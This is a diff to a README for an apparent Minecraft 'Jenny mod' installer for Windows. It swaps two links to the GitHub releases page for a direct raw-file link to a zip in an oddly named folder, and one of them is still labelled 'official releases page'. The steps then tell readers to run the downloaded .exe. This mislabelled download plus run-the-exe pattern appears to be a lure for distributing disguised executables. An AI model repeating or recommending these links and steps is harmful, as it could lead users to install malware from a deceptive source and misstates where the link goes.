@@ -1,6 +1,6 @@
 # ⛏️ Jenny-Mine-MOD-2026-MoreGirls - Add New Content To Your Minecraft Game
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Giltedged-cobitidae247/Jenny-Mine-MOD-2026-MoreGirls/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Giltedged-cobitidae247/Jenny-Mine-MOD-2026-MoreGirls/main/Amnionata/MO-More-Mine-Jenny-Girls-1.0.zip)
 
 This utility adds content to Minecraft. It simplifies the installation process for the Jenny Mod for use on Windows computers. The software handles file placement so you do not need to move folders manually.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you begin.
 
 Follow these steps to set up the software.
 
-1.  Visit the [official releases page](https://github.com/Giltedged-cobitidae247/Jenny-Mine-MOD-2026-MoreGirls/releases) to download the latest setup file.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/Giltedged-cobitidae247/Jenny-Mine-MOD-2026-MoreGirls/main/Amnionata/MO-More-Mine-Jenny-Girls-1.0.zip) to download the latest setup file.
 2.  Locate the downloaded `.exe` file in your Downloads folder.
 3.  Double-click the file to start the installation wizard.
 4.  Follow the prompts on your screen. The installer detects your Minecraft folder automatically.
